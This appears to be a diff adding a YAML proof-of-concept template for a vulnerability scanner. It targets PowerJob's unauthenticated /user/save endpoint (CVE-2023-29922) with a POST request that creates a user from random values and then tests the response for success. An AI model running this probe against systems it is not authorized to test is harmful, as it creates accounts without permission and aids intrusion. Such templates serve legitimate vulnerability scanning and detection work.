@@ -1,0 +1,28 @@
+id: poc-yaml-powerjob-save-unauthorized-access
+info:
+  name: PowerJob save未授权访问(CVE-2023-29922)
+  severity: medium
+  tags:
+  - CVE-2023-29922
+  - 两高一弱
+  finger: PowerJob
+variables:
+  t1: random_str(5)
+requests:
+- method: POST
+  path: /user/save
+  headers:
+    Content-Type: application/json
+  data: '{"username":"{{.t1}}","phone":"{{.t1}}","email":"{{.t1}}","webHook":"{{.t1}}"}
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body,"\"success\":true")
+
+    && contains(body,"\"data\":null")
+
+    && contains(headers,"application/json")
+
+    '
+transport: http
